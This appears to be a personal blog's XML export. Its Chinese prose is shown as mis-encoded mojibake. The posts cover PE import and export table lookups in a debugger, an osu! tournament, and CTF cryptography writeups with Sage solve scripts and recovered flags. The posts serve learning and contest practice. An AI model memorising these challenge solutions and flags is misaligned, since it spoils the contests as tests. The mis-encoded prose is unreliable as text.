ç¬¬ä¸€ä¸ªå€¼ä¸º7A7A(RVA) -&gt; RAW:6E7A<br>INTæ˜¯IMAGE_IMPORT_BY_NAMEç»“æ„ä½“æŒ‡é’ˆæ•°ç»„ æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ æŒ‡å‘å‡½æ•°çš„Ordinalå€¼000F å‡½æ•°çš„åç§°ä¸ºPageSetupDlgW<br>è·Ÿè¸ªIAT(RAW:6C4) æ‰¾åˆ°å¯¹åº”comdlg32.dllåº“</p>
<p>åœ¨OllyDbgä¸­æŸ¥çœ‹<br>è¯¥exeçš„ImageBaseæ˜¯01000000æ‰€ä»¥PageSetupDlgWå‡½æ•°çš„IATåœ°å€ä¸º010012C4 å…¶å€¼ä¸º75B83F20 æ˜¯APIçš„å‡†ç¡®èµ·å§‹åœ°å€<br>åœ¨ODä¸­è½¬åˆ°75B83F20å¯¹åº”çš„åæ±‡ç¼–å¯ä»¥çœ‹åˆ°æ­£æ˜¯å‡½æ•°å¼€å§‹çš„åœ°å€</p>
<p>IATçœŸçš„å¾ˆé‡è¦ï¼ è¿™äº›æ“ä½œè¦è‡ªå·±å¤šç»ƒæ‰èƒ½å¤Ÿç†Ÿæ‚‰<br>å°¤å…¶æ˜¯æ³¨æ„åˆ°IATçš„ç¬¬ä¸€ä¸ªå…ƒç´ è¢«ç¡¬ç¼–ç æˆ76324906 ä½†æ˜¯ODä¸­å®é™…åœ°å€åº”è¯¥æ˜¯75B83F20ï¼ï¼ æ‰€ä»¥è¦åˆ©ç”¨ImageBase+dllâ€™sIAT(RVA)æ¥æ‰¾!</p>
<h1 id="13-6-EAT"><a href="#13-6-EAT" class="headerlink" title="13.6 EAT"></a>13.6 EAT</h1><p>ç»§ç»­å­¦ä¹ EAT<br>EATä½¿å¾—ä¸åŒçš„åº”ç”¨ç¨‹åºå¯ä»¥è°ƒç”¨åº“æ–‡ä»¶ä¸­æä¾›çš„å‡½æ•° å¯¹åº”äºDLL&#x2F;SYS (IATå¯¹åº”äºexe)<br>åªæœ‰é€šè¿‡EATæ‰èƒ½å‡†ç¡®æ±‚å¾—ä»ç›¸åº”åº“ä¸­å¯¼å‡ºå‡½æ•°çš„èµ·å§‹åœ°å€<br>å¯¹åº” IMAGE_EXPORT_DIRECTORY PEæ–‡ä»¶ä¸­ä»…æœ‰ä¸€ä¸ªIMAGE_EXPORT_DIRECTORYç»“æ„ä½“</p>
<p>NTå¯é€‰å¤´çš„DataDirectory[0].VitrualAdddressçš„å€¼å³ä¸ºIEDç»“æ„ä½“æ•°ç»„çš„èµ·å§‹åœ°å€(RVA)<br>å†å¤ä¹ ä¸‹: DataDirectoryæœ‰ä¸¤ä¸ªDWORDæˆå‘˜ VitrualAddresså’ŒSize<br>ç”¨CFFå’ŒWinHexæŸ¥çœ‹<br>ExportDirectoryçš„RVAåç§»ä¸º168 å€¼ä¸º262C &#x3D;&gt; RAW:1A2C<br>EDçš„sizeåç§»ä¸º16C å€¼ä¸º6CFD</p>
<h2 id="13-6-1-IMAGE-EXPORT-DIRECTORY"><a href="#13-6-1-IMAGE-EXPORT-DIRECTORY" class="headerlink" title="13.6.1 IMAGE_EXPORT_DIRECTORY"></a>13.6.1 IMAGE_EXPORT_DIRECTORY</h2><p>ä¸‹é¢ä»‹ç»IMAGE_EXPORT_DIRECTORYç»“æ„ä½“ä¸­çš„é‡è¦æˆå‘˜</p>
<ul>
<li>NumberOfFunctions: å®é™…Exportå‡½æ•°çš„ä¸ªæ•°</li>
<li>NumberOfNames: Exportå‡½æ•°ä¸­å…·æœ‰åå­—çš„å‡½æ•°ä¸ªæ•°</li>
<li>AddressOfFunctions: Exportå‡½æ•°åœ°å€æ•°ç»„</li>
<li>AddressOfNames: å‡½æ•°åç§°åœ°å€æ•°ç»„</li>
<li>AddressOfNameOrdinals: Ordinalåœ°å€æ•°ç»„</li>
</ul>
<p>kernel32.dll:</p>
<p><img src="https://s2.loli.net/2023/12/04/qanN2eP5TIwLRBv.png" alt="img"></p>
<p>ä»åº“ä¸­è·å–å‡½æ•°åœ°å€çš„APIä¸ºGetProcAddress()å‡½æ•° è¯¥APIé€šè¿‡å¼•ç”¨EATæ¥è·å–æŒ‡å®šAPIçš„åœ°å€<br>GetProcAddress()æ“ä½œåŸç†:</p>
<ol>
<li>åˆ©ç”¨AddressOfNamesæˆå‘˜è½¬åˆ°å‡½æ•°åç§°æ•°ç»„</li>
<li>å‡½æ•°åç§°æ•°ç»„ä¸­å­˜å‚¨ç€å­—ç¬¦ä¸²çš„åœ°å€ é€šè¿‡strcmpæ¯”è¾ƒå­—ç¬¦ä¸² æŸ¥æ‰¾æŒ‡å®šå‡½æ•°çš„åç§°(æ­¤æ—¶æ•°ç»„ç´¢å¼•è®°ä¸ºname_index)</li>
<li>åˆ©ç”¨AddressOfNameOrdinalsæˆå‘˜ è½¬åˆ°ordinalæ•°ç»„</li>
<li>åœ¨ordinalæ•°ç»„ä¸­é€šè¿‡name_indexæŸ¥æ‰¾ç›¸åº”ordinalçš„å€¼</li>
<li>åˆ©ç”¨AddressOfFunctionsæˆå‘˜è½¬åˆ°å‡½æ•°åœ°å€æ•°ç»„(EAT)</li>
<li>åˆ©ç”¨4ä¸­æ±‚åˆ°çš„ordinalå€¼ä½œä¸ºæ•°ç»„ç´¢å¼• åœ¨EATä¸­è·å¾—æŒ‡å®šå‡½æ•°çš„èµ·å§‹åœ°å€</li>
</ol>
<h2 id="13-6-2-ä½¿ç”¨kernel32-dllç»ƒä¹ "><a href="#13-6-2-ä½¿ç”¨kernel32-dllç»ƒä¹ " class="headerlink" title="13.6.2 ä½¿ç”¨kernel32.dllç»ƒä¹ "></a>13.6.2 ä½¿ç”¨kernel32.dllç»ƒä¹ </h2><p>ç»ƒä¹ ä»kernel32.dllæ–‡ä»¶çš„EATä¸­æŸ¥æ‰¾AddAtomWå‡½æ•°<br>å‰é¢è®¡ç®—è¿‡IMAGE_EXPORT_DIRECTORYçš„RAWåç§»ä¸º1A2C(CFFå¥½åƒè½¬åˆ°è¾“å‡ºç›®å½•ç›´æ¥å°±èƒ½çœ‹)<br>WinHexä¸­æ‰¾åˆ°<br>AddressOfName: offset:1A4C å€¼:3538(RVA) -&gt; RAW:2938<br>æ‰¾æ‰“ç¬¬ä¸‰ä¸ªåœ°å€: 4BB3(RVA) -&gt; RAW:3FB3<br>æ‰¾åˆ°æŸ¥çœ‹ ç¡®å®æ˜¯AddAtomwçš„å­—ç¬¦ä¸²!</p>
<p>åŒæ ·å¯ä»¥æŸ¥åˆ°AddAtomWå¯¹åº”çš„ordinal&#x3D;2(å¯¹åº”æ•°ç»„ç¬¬3ä¸ªå…ƒç´ )<br>æœ€åæŸ¥æ‰¾AddAtomWçš„å®é™…å‡½æ•°åœ°å€<br>AddressOfFunctions: RAW:1A48 å€¼ 2654(RVA) -&gt; RAW:1A54<br>è¿™æ˜¯æ•°ç»„èµ·å§‹ä½ç½® æˆ‘ä»¬å·²çŸ¥ordinalä¸º2 æ‰€ä»¥æ‰¾ç¬¬ä¸‰ä¸ª å¯¹åº”åœ°å€1A5C å¾—åˆ°çš„å€¼:0326D9(RVA)<br>è¿™é‡Œçš„RVAæ˜¯ç›¸å¯¹kernel32.dllçš„ImageBaseçš„<br>åœ¨NTå¯é€‰å¤´æŸ¥çœ‹ImageBaseçš„å€¼: 7C800000 æ‰€ä»¥ AddAtomWå‡½æ•°çš„VAå€¼ä¸ºRVA+IB &#x3D; 7C8326D9<br>åœ¨ODä¸­æŸ¥çœ‹éªŒè¯(ç„¶è€Œæˆ‘ç”¨ODæ‰“å¼€çœ‹ä¸åˆ°è¿™æ®µçš„å†…å­˜â€¦)<br>ç”¨IDAæ‰“å¼€ä¸€æ · æ‰¾åˆ°è¿™ä¸ªåœ°å€<br><img src="https://s2.loli.net/2023/12/04/sgUdRnqeV8HJ9Ic.png" alt="img"></p>
<p>å¯ä»¥çœ‹åˆ°ç¡®å®å°±æ˜¯AddAtomwå‡½æ•°çš„åœ°å€ï¼ï¼ï¼</p>
<hr>
<p>ç¬¬ä¸€éçœ‹çš„æ—¶å€™åªæ˜¯è¿‡äº†ä¸€éæ¦‚å¿µ æ²¡æœ‰è·Ÿç€ä¹¦ä¸Šä¸€èµ·ç®—RVA-&gt;RAWåœ¨winhexä¸­æ¥æ‰¾å¯¹åº”å€¼ ä¹Ÿæ²¡æœ‰å¼€ODæ¥çœ‹<br>å®æ“ä¸€éæ”¶è·è¿˜æ˜¯æŒºå¤šçš„ PEæ–‡ä»¶æ ¼å¼æ˜¯é‡ä¸­ä¹‹é‡ï¼ä¸€å®šè¦åå¤çœ‹~ï¼</p>
]]></content>
      <categories>
        <category>ReverseEngineering</category>
      </categories>
  </entry>
  <entry>
    <title>osu</title>
    <url>/2023/12/03/osu/</url>
    <content><![CDATA[<p><strong>Welcome to osu!</strong></p>
<span id="more"></span>

<h1 id="OWC2023-Korea-VS-USA"><a href="#OWC2023-Korea-VS-USA" class="headerlink" title="OWC2023 Korea VS USA"></a>OWC2023 Korea VS USA</h1><p>å¾ˆå¥½å¥‡ä¸ºä»€ä¹ˆè¦è¿ç€æ‰“ä¸¤åœºï¼Ÿ<br>masakaç¬¬ä¸€åœºç®—æ˜¯èƒœè€…ç»„å†³èµ› ç„¶åbracket resetå†æ¥æ‰“çœŸæ­£çš„grandfinalï¼ŸğŸ¤–</p>
<p><img src="https://s2.loli.net/2023/12/03/QslebCr415jmOwY.png" alt="img"></p>
<p><img src="https://s2.loli.net/2023/12/03/Yuv79oQjWOH6npJ.png" alt="img"></p>
<p>How Could He make it!!!WTF!!! MY GOD WORST_HR_PLAYER!!!!</p>
<p>FMçš„strategyï¼š</p>
<p><img src="https://s2.loli.net/2023/12/03/URiJLec6dNvSklo.png" alt="img"></p>
<p>flyingtunaä¸€äººæ‰¿æ‹…æ‰€æœ‰ ç„¶åè®©Karcheræ‰“NM(other than HR)FC<br>what  a textbook strategyï¼ï¼ï¼ wow !!!</p>
<p>Are you kidding me ??? lolğŸ˜‚</p>
<p><img src="https://s2.loli.net/2023/12/03/ny1Cz9uobixJlaF.png" alt="img"></p>
<p>How can you hit without anything? lol.O(âˆ©_âˆ©)O</p>
<p>Finally, we have TieBreakerâ€¦<br>WTF TB: 8.60â­ length:6:43 WTF</p>
<p><img src="https://s2.loli.net/2023/12/04/hXvoSkIZlO2yu8L.png" alt="img"></p>
<p>å“ USAå‡ è¿å† äº†å•Šâ€¦ Koreaå¤ªå¯æƒœäº†å•Šå•Šï¼ ä¸ºä»€ä¹ˆæœ€åTBä¸ä¸Šworst_hr_player å•Šï¼ï¼ï¼ï¼ï¼ï¼ï¼ å¤ªå¯æƒœäº†å§~</p>
]]></content>
      <categories>
        <category>osu</category>
      </categories>
  </entry>
  <entry>
    <title>GroebneråŸº</title>
    <url>/2023/12/04/Groebner%E5%9F%BA/</url>
    <content><![CDATA[<p>ç›®å‰è¿˜å®Œå…¨ç†è§£ä¸äº†åŸç† å…ˆè®°å½•ä¸€äº›ä¸GroebneråŸºæœ‰å…³çš„é¢˜ç›®</p>
<span id="more"></span>

<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="2019çº¢å¸½æ¯related"><a href="#2019çº¢å¸½æ¯related" class="headerlink" title="2019çº¢å¸½æ¯related"></a>2019çº¢å¸½æ¯related</h2><p>é¢˜ç›®ç»™å®š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n</span><br><span class="line">s = s0+s1+s2</span><br><span class="line">c0 = s0^<span class="number">17</span> (mod n)</span><br><span class="line">c1 = s1^<span class="number">17</span> (mod n)</span><br><span class="line">c2 = s2^<span class="number">17</span> (mod n)</span><br><span class="line">c3 = s3^<span class="number">17</span> (mod n)</span><br><span class="line">s3 = <span class="number">65537</span>*s0 - <span class="number">66666</span>*s1 + <span class="number">12345</span>*s2</span><br></pre></td></tr></table></figure>
<p>æ±‚s0,s1,s2</p>
<p>é¢˜ç›®å¤§è‡´å¯ä»¥çœ‹æˆä¸€ç§ç›¸å…³æ¶ˆæ¯æ”»å‡»çš„å˜å½¢ wikiæä¾›äº†ä»¥ä¸‹æ–¹æ³•</p>
<p><img src="https://s2.loli.net/2023/12/04/arkovT57ScK42Zj.png" alt="img"></p>
<p>sageæ‰“å°ä¸€ä¸‹ä¸­é—´æ±‚å¾—çš„groebneråŸº æ˜¯è¿™ç§å½¢å¼:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[x + <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498137656000537211565616276407165730632699</span>, y + <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498129910188939072517737868873227804201884</span>, z + <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498069823870958439283760172034252636423374</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498205967870181640370981402627360812251649</span></span><br><span class="line">s = <span class="number">280513550110197745829890567436265496990</span></span><br><span class="line">c1 = <span class="number">10607235400098586699994392584841806592000660816191315008947917773605476365884572056544621466807636237415893192966935651590312237598366247520986667580174438232591692369894702423377081613821241343307094343575042030793564118302488401888197517625333923710172738913771484628557310164974384462856047065486913046647133386246976457961265115349103039946802386897315176633274295410371986422039106745216230401123542863714301114753239888820442112538285194875243192862692290859625788686421276234445677411280606266052059579743874849594812733193363406594409214632722438592376518310171297234081555028727538951934761726878443311071990</span></span><br><span class="line">c2 = <span class="number">2665348075952836665455323350891842781938471372943896177948046901127648217780657532963063228780230203325378931053293617434754585479452556620021360669764370971665619743473463613391689402725053682169256850873752706252379747752552015341379702582040497607180172854652311649467878714425698676142212588380080361100526614423533767196749274741380258842904968147508033091819979042560336703564128279527380969385330845759998657540777339113519036552454829323666242269607225156846084705957131127720351868483375138773025602253783595007177712673092409157674720974653789039702431795168654387038080256838321255342848782705785524911705</span></span><br><span class="line">c3 = <span class="number">4881225713895414151830685259288740981424662400248897086365166643853409947818654509692299250960938511400178276416929668757746679501254041354795468626916196040017280791985239849062273782179873724736552198083211250561192059448730545500442981534768431023858984817288359193663144417753847196868565476919041282010484259630583394963580424358743754334956833598351424515229883148081492471874232555456362089023976929766530371320876651940855297249474438564801349160584279330339012464716197806221216765180154233949297999618011342678854874769762792918534509941727751433687189532019000334342211838299512315478903418642056097679717</span></span><br><span class="line"></span><br><span class="line">R.&lt;x,y,z&gt; = Zmod(n)[]</span><br><span class="line">I = ideal(x+y+z-s,x^<span class="number">17</span>-c1,y^<span class="number">17</span>-c2,z^<span class="number">17</span>-c3)</span><br><span class="line">res = I.groebner_basis()</span><br><span class="line">m1 = -<span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498137656000537211565616276407165730632699</span></span><br><span class="line">m2 = -<span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498129910188939072517737868873227804201884</span></span><br><span class="line">m3 = -<span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498069823870958439283760172034252636423374</span></span><br><span class="line"></span><br><span class="line">m1 = m1%n</span><br><span class="line">m2 = m2%n</span><br><span class="line">m3 = m3%n</span><br><span class="line"></span><br><span class="line">m = (m3&lt;&lt;<span class="number">256</span>)+(m2&lt;&lt;<span class="number">128</span>)+m1</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;bf684fc7-5398-4bf3-ad5f-cfe3dc53a202&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>
<p>å…ˆè®°ç€å§ å®Œå…¨æ²¡ææ‡‚groebneråŸºçš„ç¥å¥‡ä½œç”¨</p>
<h2 id="DASCTF-Apr-2023-ECC"><a href="#DASCTF-Apr-2023-ECC" class="headerlink" title="DASCTF Apr.2023 ECC"></a>DASCTF Apr.2023 ECC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, p, q, a, b, e1, e2, e3</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q)</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;DASCTF&#123;&quot;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECC</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, p, q, e</span>):</span><br><span class="line">        self.p, self.q = p, q</span><br><span class="line">        self.a, self.b = a, b</span><br><span class="line">        self.N         = p * q</span><br><span class="line">        self.e         = e</span><br><span class="line">        self.Kbits     = <span class="number">8</span></span><br><span class="line">        self.Ep        = EllipticCurve(IntegerModRing(p), [a, b])</span><br><span class="line">        self.Eq        = EllipticCurve(IntegerModRing(q), [a, b])</span><br><span class="line"></span><br><span class="line">        N1 = self.Ep.order()</span><br><span class="line">        N2 = <span class="number">2</span> * p + <span class="number">2</span> - N1</span><br><span class="line">        N3 = self.Eq.order()</span><br><span class="line">        N4 = <span class="number">2</span> * q + <span class="number">2</span> - N3</span><br><span class="line"></span><br><span class="line">        self.d = &#123;</span><br><span class="line">            ( <span class="number">1</span>,  <span class="number">1</span>): inverse_mod(e, lcm(N1, N3)),</span><br><span class="line">            ( <span class="number">1</span>, -<span class="number">1</span>): inverse_mod(e, lcm(N1, N4)),</span><br><span class="line">            (-<span class="number">1</span>,  <span class="number">1</span>): inverse_mod(e, lcm(N2, N3)),</span><br><span class="line">            (-<span class="number">1</span>, -<span class="number">1</span>): inverse_mod(e, lcm(N2, N4))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        self.E = EllipticCurve(IntegerModRing(self.N), [a, b])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        msg_point = self.msg_to_point(plaintext, <span class="literal">True</span>)</span><br><span class="line">        mp = self.Ep(msg_point)</span><br><span class="line">        mq = self.Eq(msg_point)</span><br><span class="line">        cp = (self.e * mp).xy()</span><br><span class="line">        cq = (self.e * mq).xy()</span><br><span class="line">        cp = (<span class="built_in">int</span>(cp[<span class="number">0</span>]), <span class="built_in">int</span>(cp[<span class="number">1</span>]))</span><br><span class="line">        cq = (<span class="built_in">int</span>(cq[<span class="number">0</span>]), <span class="built_in">int</span>(cq[<span class="number">1</span>]))</span><br><span class="line">        c  = (<span class="built_in">int</span>(crt([cp[<span class="number">0</span>], cq[<span class="number">0</span>]], [self.p, self.q])), \</span><br><span class="line">              <span class="built_in">int</span>(crt([cp[<span class="number">1</span>], cq[<span class="number">1</span>]], [self.p, self.q])))</span><br><span class="line">        c = self.E(c)</span><br><span class="line">        <span class="keyword">return</span> c.xy()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        x = ciphertext</span><br><span class="line">        w = x^<span class="number">3</span> + self.a*x + self.b % self.N</span><br><span class="line"></span><br><span class="line">        P.&lt;Yp&gt; = PolynomialRing(Zmod(self.p))</span><br><span class="line">        fp = x^<span class="number">3</span> + self.a*x + self.b -Yp^<span class="number">2</span></span><br><span class="line">        yp = fp.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        P.&lt;Yq&gt; = PolynomialRing(Zmod(self.q))</span><br><span class="line">        fq = x^<span class="number">3</span> + self.a*x + self.b -Yq^<span class="number">2</span></span><br><span class="line">        yq = fq.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        y = crt([<span class="built_in">int</span>(yp), <span class="built_in">int</span>(yq)], [self.p, self.q])</span><br><span class="line"></span><br><span class="line">        cp, cq = self.Ep((x, y)), self.Eq((x, y))</span><br><span class="line">        legendre_symbol_p = legendre_symbol(w, self.p)</span><br><span class="line">        legendre_symbol_q = legendre_symbol(w, self.q)</span><br><span class="line"></span><br><span class="line">        mp = (self.d[(legendre_symbol_p, legendre_symbol_q)] * cp).xy()</span><br><span class="line">        mq = (self.d[(legendre_symbol_p, legendre_symbol_q)] * cq).xy()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> crt([<span class="built_in">int</span>(mp[<span class="number">0</span>]), <span class="built_in">int</span>(mq[<span class="number">0</span>])], [self.p, self.q]) &gt;&gt; self.Kbits</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">msg_to_point</span>(<span class="params">self, x, shift=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> shift:</span><br><span class="line">            x &lt;&lt;= self.Kbits</span><br><span class="line">        res_point = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> &lt;&lt; self.Kbits):</span><br><span class="line">            P.&lt;Yp&gt; = PolynomialRing(Zmod(self.p))</span><br><span class="line">            fp = x^<span class="number">3</span> + self.a*x + self.b - Yp^<span class="number">2</span></span><br><span class="line">            P.&lt;Yq&gt; = PolynomialRing(Zmod(self.q))</span><br><span class="line">            fq = x^<span class="number">3</span> + self.a*x + self.b - Yq^<span class="number">2</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                yp, yq = <span class="built_in">int</span>(fp.roots()[<span class="number">0</span>][<span class="number">0</span>]), <span class="built_in">int</span>(fq.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">                y = crt([yp, yq], [self.p, self.q])</span><br><span class="line">                E = EllipticCurve(IntegerModRing(self.p*self.q), [self.a, self.b])</span><br><span class="line">                res_point = E.point((x, y))</span><br><span class="line">                <span class="keyword">return</span> res_point</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res_point</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ecc1 = ECC(a, b, p, q, e1)</span><br><span class="line">ecc2 = ECC(a, b, p, q, e2)</span><br><span class="line">ecc3 = ECC(a, b ,p, q, e3)</span><br><span class="line">gift = p * q * getPrime(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">secret = bytes_to_long(flag[<span class="number">7</span>:-<span class="number">1</span>].encode())</span><br><span class="line">ciphertext1 = ecc1.enc(secret)</span><br><span class="line">ciphertext2 = ecc2.enc(secret)</span><br><span class="line">ciphertext3 = ecc3.enc(secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    </span><br><span class="line">    f.write(<span class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;e3 = <span class="subst">&#123;e3&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;gift = <span class="subst">&#123;gift&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;C1 = <span class="subst">&#123;ciphertext1&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;C2 = <span class="subst">&#123;ciphertext2&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;C3 = <span class="subst">&#123;ciphertext3&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é™„ä»¶:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">516257683822598401</span></span><br><span class="line">e2 = <span class="number">391427904712695553</span></span><br><span class="line">e3 = <span class="number">431785901506020973</span></span><br><span class="line">gift = <span class="number">10954621221812651197619957228527372749810730943802288293715079353550311138677754821746522832935330138708418986232770630995550582619687239759917418738050269898943719822278514605075330569827210725314869039623167495140328454254640051293396463956732280673238182897228775094614386379902845973838934549168736103799539422716766688822243954145073458283746306858717624769112552867126607212724068484647333634548047278790589999183913</span></span><br><span class="line">C1 = (<span class="number">1206929895217993244310816423179846824808172528120308055773133254871707902120929022352908110998765937447485028662679732041</span>, <span class="number">652060368795242052052268674691241294013033011634464089331399905627588366001436638328894634036437584845563026979258880828</span>)</span><br><span class="line">C2 = (<span class="number">1819289899794579183151870678118089723240127083264590266958711858768481876209114055565064148870164568925012329554392844153</span>, <span class="number">1110245535005295568283994217305072930348872582935452177061131445872842458573911993488746144360725164302010081437373324551</span>)</span><br><span class="line">C3 = (<span class="number">1112175463080774353628562547288706975571507012326470665917118873336738873653792420189391867408691423887642725415133046354</span>, <span class="number">1820636035485820691083758790204536675748006232767111209985774382700260408550258280489088658228739971137550264759084468620</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ECCå­¦çš„è¿˜æ˜¯å¤ªè‚¤æµ…äº† æ¶è¡¥ä¸€ä¸‹ECCå†æ¥çœ‹å§ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Crypto-Other</title>
    <url>/2023/12/04/Crypto-Other/</url>
    <content><![CDATA[<p>ä¸€äº›æ‚é¢˜(å¯†ç )&#x2F; (ä»¥å‰)æ¯”èµ›çš„å¯†ç é¢˜</p>
<span id="more"></span>

<h1 id="tsgctf2020"><a href="#tsgctf2020" class="headerlink" title="tsgctf2020"></a>tsgctf2020</h1><h2 id="beginners-crypto"><a href="#beginners-crypto" class="headerlink" title="beginners_crypto"></a>beginners_crypto</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()) &lt;= <span class="number">50</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">str</span>(<span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), byteorder=<span class="string">&#x27;big&#x27;</span>) &lt;&lt; <span class="number">10000</span>).endswith(<span class="string">&#x27;1002773875431658367671665822006771085816631054109509173556585546508965236428620487083647585179992085437922318783218149808537210712780660412301729655917441546549321914516504576&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æç€å¼€å§‹æ²¡ææ‡‚é¢˜ç›®æ„æ€â€¦<br>è¿™å…¶å®å°±ç­‰ä»·äº ç»™å‡º <code>m*2**10000 = s (mod 10**175)</code>â€¦<br>ç”±äºä¸äº’ç´  ä¸èƒ½ç›´æ¥å°†é€†å…ƒä¹˜è¿‡å»<br>ä¸¤ç§æ–¹æ³•:</p>
